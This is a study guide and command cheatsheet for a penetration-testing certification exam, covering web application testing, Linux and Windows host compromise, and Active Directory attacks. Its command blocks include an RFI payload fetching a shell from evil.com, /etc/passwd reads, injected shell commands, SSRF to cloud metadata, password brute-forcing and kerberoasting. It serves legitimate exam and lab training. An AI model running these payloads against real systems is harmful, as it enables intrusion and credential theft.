# Exam Guide

## Exam Overview

### Format and Logistics
- **Duration**: 48 hours
- **Passing Score**: 750/1000 points
- **Free Retake**: Available
- **Documentation**: All commands must save outputs to files

### Components and Scoring

#### 1. AppSec (40% of exam)
- Find and exploit 4 vulnerabilities
- Capture 4 flags
- Focus on OWASP Top 10 and Web Fundamentals
- All outputs must be saved to files

#### 2. NetSec (30% of exam)
- Compromise 2 hosts:
  - 1 Windows machine
  - 1 Linux machine
- Perform privilege escalation
- Escalate to root/admin
- All outputs must be saved to files

#### 3. Active Directory (30% of exam)
- Breach the AD server
- Enumerate the environment
- Escalate to domain controller
- All outputs must be saved to files

### Required Paths

#### Junior Penetration Tester Path
1. Passive Reconnaissance
2. Active Reconnaissance
3. Nmap Live Host Discovery
4. Nmap Basic Port Scans
5. Nmap Advanced Port Scans
6. Nmap Port Scans
7. Protocols and Servers
8. Vulnerabilities 101
9. Exploit Vulnerabilities
10. Vulnerabilities Capstone
11. Metasploit Introduction
12. Metasploit Exploitation
13. Metasploit Meterpreter
14. Linux Privilege Escalation
15. Windows Privilege Escalation

#### Web Fundamentals Path
1. Subdomain Enumeration
2. Authentication Bypass
3. IDOR
4. File Inclusion
5. SSRF
6. XSS (Cross-site Scripting)
7. Command Injection
8. SQL Injection
9. Burp Suite
10. OWASP API Security

### Practice Rooms
Essential rooms to complete:
- Blue
- Net Sec Challenge
- Pickle Rick
- Reset
- Ledger
- Billing
- Rabbit Store
- K2
- Stealth
- Silver Platter
- Lookback
- AVenger

## Tips & Tricks

### General Tips
1. **Always Save Outputs**
   - Use `tee` for all commands
   - Create organized directories for each component
   - Example: `mkdir -p appsec/netsec/ad && cd appsec`

2. **Time Management**
   - AppSec: ~20 hours
   - NetSec: ~14 hours
   - AD and reporting: ~10 hours
   - Leave 4 hours buffer for unexpected issues

3. **Documentation Strategy**
   - Take screenshots of all findings
   - Save all command outputs
   - Document steps in real-time
   - Use the provided report template

### Component-Specific Tips

#### AppSec Tips
1. Start with subdomain enumeration
2. Use automated tools first (sqlmap, dalfox)
3. Test for low-hanging fruit (XSS, SQLi)
4. Save all Burp Suite requests/responses
5. Document all parameters tested

#### NetSec Tips
1. Begin with full port scans
2. Document all open services
3. Try default credentials first
4. Use linpeas/winpeas for privilege escalation
5. Save all exploit attempts

#### AD Tips
1. Start with basic enumeration
2. Use BloodHound for mapping
3. Focus on kerberoasting
4. Document all user/group findings
5. Save all credential dumps

### Command Output Strategy
```bash
# Create directory structure
mkdir -p exam/{appsec,netsec,ad}/{recon,exploit,post}

# Example command with output saving
nmap -sC -sV -A -T4 target | tee exam/netsec/recon/nmap_scan.txt

# Save screenshots
gnome-screenshot -f exam/appsec/screenshots/xss_vulnerability.png

# Save Burp Suite data
# File > Save Project > exam/appsec/burp/project.burp
```

### Practice Strategy
1. Complete all paths in order
2. Practice in recommended rooms
3. Time yourself during practice
4. Use the same output saving strategy
5. Write practice reports

## Table of Contents
- [Preparation Checklist](#preparation-checklist)
- [1. AppSec: Web Application Testing](#1-appsec-web-application-testing)
- [2. NetSec: Compromise Linux and Windows Hosts](#2-netsec-compromise-linux-and-windows-hosts)
- [3. Active Directory: Breach and Escalate](#3-active-directory-breach-and-escalate)
- [4. Reporting](#4-reporting)
- [Quick Reference Cheatsheet](#quick-reference-cheatsheet)
- [Exam Day Strategy](#exam-day-strategy)
- [Additional Resources](#additional-resources)

## Preparation Checklist

### Tools Installation
Install the following tools on Kali Linux:

#### Reconnaissance
```bash
sudo apt install nmap rustscan theharvester whois dnsenum fierce massdns
```

#### Web Testing
```bash
sudo apt install sqlmap dalfox xsstrike ffuf gobuster nikto wpscan dirsearch paramspider arjun nuclei sslscan
```

#### Network Testing
```bash
sudo apt install hydra medusa crackmapexec enum4linux smbclient snmpwalk xfreerdp tcpdump wireshark mitmproxy
```

#### Active Directory
```bash
# Install BloodHound and Neo4j
sudo apt install bloodhound neo4j
```

#### Post-Exploitation
```bash
sudo apt install metasploit-framework
```

### Wordlists
- Use seclists and rockyou.txt (`/usr/share/wordlists/`)

### Setup
1. Configure Burp Suite proxy with browser
2. Set up BloodHound and Neo4j for AD
3. Test tools in TryHackMe rooms:
   - Blue
   - Pickle Rick
   - Reset
   - Ledger
   - Billing
   - Rabbit Store
   - K2
   - Stealth
   - Silver Platter
   - Lookback
   - AVenger

## 1. AppSec: Web Application Testing

### Overview
- 4 Vulnerabilities to identify and exploit
- 4 Flags to capture
- 40% of exam score
- Focus on OWASP Top 10 and Web Fundamentals

### Key Tools
```bash
sqlmap dalfox xsstrike ffuf gobuster nikto wpscan burpsuite dirsearch paramspider arjun nuclei sslscan waybackurls gau katana gowitness
```

### Testing Areas
1. [Subdomain Enumeration](#subdomain-enumeration)
2. [Authentication Bypass](#authentication-bypass)
3. [IDOR](#idor)
4. [File Inclusion](#file-inclusion)
5. [SSRF](#ssrf)
6. [XSS](#xss)
7. [Command Injection](#command-injection)
8. [SQL Injection](#sql-injection)
9. [Burp Suite](#burp-suite)
10. [OWASP API Security](#owasp-api-security)

### Subdomain Enumeration
```bash
# Enumerate subdomains
dnsenum target.com | tee dnsenum_subdomains.txt
fierce --domain target.com | tee fierce_subdomains.txt
massdns -r resolvers.txt -t A target.com -o S | tee massdns_subdomains.txt
theHarvester -d target.com -b all | tee theharvester_subdomains.txt
subfinder -d target.com -o subfinder_subdomains.txt
amass enum -d target.com -o amass_subdomains.txt
```

### Authentication Bypass
```bash
# Brute-force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "http://target/login:username=^USER^&password=^PASS^:F=invalid" -o hydra_login.txt

# Test weak credentials
curl -d "username=admin&password=admin" -X POST http://target/login | tee auth_test.txt

# Check cookie-based bypass
curl -b "session=admin" http://target/dashboard | tee cookie_bypass.txt
```

### IDOR
```bash
# Test IDOR by changing IDs
curl -v "http://target/profile?id=1" | tee idor_user1.txt
curl -v "http://target/profile?id=2" | tee idor_user2.txt

# Brute-force IDs
ffuf -w /usr/share/wordlists/seclists/Miscellaneous/ids.txt -u "http://target/profile?id=FUZZ" -o ffuf_idor.json | tee ffuf_idor.txt
```

### File Inclusion
```bash
# Test LFI
curl -v "http://target/page?page=../../../../etc/passwd" | tee lfi_passwd.txt
curl -v "http://target/page?page=php://filter/convert.base64-encode/resource=index.php" | tee lfi_filter.txt

# Test RFI
curl -v "http://target/page?page=http://evil.com/shell.txt" | tee rfi_shell.txt
```

### SSRF
```bash
# Test SSRF to localhost
curl -v "http://target/page?url=http://localhost" | tee ssrf_localhost.txt

# Test SSRF to cloud metadata
curl -v "http://target/page?url=http://169.254.169.254/latest/meta-data/" | tee ssrf_aws.txt
```

### XSS
```bash
# Test XSS with automated tools
dalfox url http://target | tee dalfox_xss.txt
xsstrike -u http://target | tee xsstrike_xss.txt

# Manual XSS testing
curl -v "http://target/page?search=<script>alert(1)</script>" | tee xss_basic.txt
```

### Command Injection
```bash
# Test command injection
curl -v "http://target/page?cmd=;id" | tee cmd_injection_id.txt
curl -v "http://target/page?cmd=&&whoami" | tee cmd_injection_whoami.txt
```

### SQL Injection
```bash
# Test SQL injection
sqlmap -u "http://target/page?id=1" --dbs --output-dir=sqlmap_output | tee sqlmap_summary.txt
sqlmap -u "http://target/login" --data="username=admin&password=*" --technique=B --output-dir=sqlmap_login | tee sqlmap_login.txt
```

## 2. NetSec: Compromise Linux and Windows Hosts

### Reconnaissance
```bash
# Port scanning
nmap -sC -sV -A -T4 target -oN nmap_scan.txt
rustscan -a target -- -sV -O | tee rustscan_output.txt

# Banner grabbing
nc -nv target 80 | tee banner_http.txt
telnet target 80 | tee telnet_http.txt
```

### Service Enumeration
```bash
# SMB
enum4linux -a target | tee enum4linux_output.txt
smbclient -L //target/ | tee smb_shares.txt

# FTP
nmap -p 21 --script ftp-anon,ftp-brute target -oN ftp_nmap.txt

# SSH
nmap -p 22 --script ssh-auth-methods,ssh-brute target -oN ssh_nmap.txt

# Subdomain
subfinder -d domain.com -v | httpx | tee subfinder.txt
# Vulnerability Scanning with nuclei
nuclei -u https://example.com
# Vulnerability Scanning with nikto
nikto -h http://domain.com

#One go
subfinder -d domain.com -v | httpx -silent | naabu -silent | katana -silent | cvemap | tee results.txt

# SSL Scanning with sslscan
sslscan domain.com
# Directory Brute-Forcing with dirsearch
dirsearch -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
# Directory Brute-Forcing with ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://domain.com/FUZZ
# Directory Brute-Forcing with gobuster
gobuster dir -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
```

### Exploitation
```bash
# Brute-force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target -o hydra_ssh.txt
crackmapexec smb target -u user -p /usr/share/wordlists/rockyou.txt | tee cme_smb_brute.txt
```

### Privilege Escalation
```bash
# Linux
./linpeas.sh | tee linpeas_output.txt
find / -perm -4000 2>/dev/null | tee suid_bins.txt

# Windows
winPEAS.exe | tee winpeas_output.txt
whoami /priv | tee user_privs.txt
```

## 3. Active Directory: Breach and Escalate

### Enumeration
```bash
# Basic enumeration
net user /domain | tee ad_users.txt
net group "Domain Admins" /domain | tee ad_domain_admins.txt

# BloodHound
SharpHound.exe -c all --zipfilename bloodhound_data.zip
```

### Exploitation
```bash
# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x -outputfile kerberoast_hashes.txt

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
```

## 4. Reporting

### Template
```markdown
# Vulnerability Report

## Title
[Vulnerability Name]

## Description
[Impact and details]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Evidence
- [Screenshots]
- [Command outputs]

## Mitigation
[Recommended fixes]
```

## Quick Reference Cheatsheet

| Component | Command | Purpose |
|-----------|---------|---------|
| AppSec | `dnsenum target.com` | Subdomain enumeration |
| AppSec | `sqlmap -u "http://target/page?id=1"` | SQL injection |
| AppSec | `dalfox url http://target` | XSS testing |
| NetSec | `nmap -sC -sV -A -T4 target` | Port scanning |
| NetSec | `hydra -l user -P rockyou.txt ssh://target` | Brute-forcing |
| AD | `SharpHound.exe -c all` | BloodHound collection |

## Exam Day Strategy

### Time Management
- AppSec: ~20 hours
- NetSec: ~14 hours
- AD and reporting: ~10 hours

### Workflow
1. Start with AppSec
2. Move to NetSec
3. Tackle AD
4. Document continuously

### Tips
- Save outputs with `tee` for real-time review
- Use checklists to track progress
- Practice in TryHackMe rooms

## Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [SecLists GitHub](https://github.com/danielmiessler/SecLists)
- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- TryHackMe Rooms:
  - Blue
  - Pickle Rick
  - Net Sec Challenge
  - Ledger
  - Billing

---
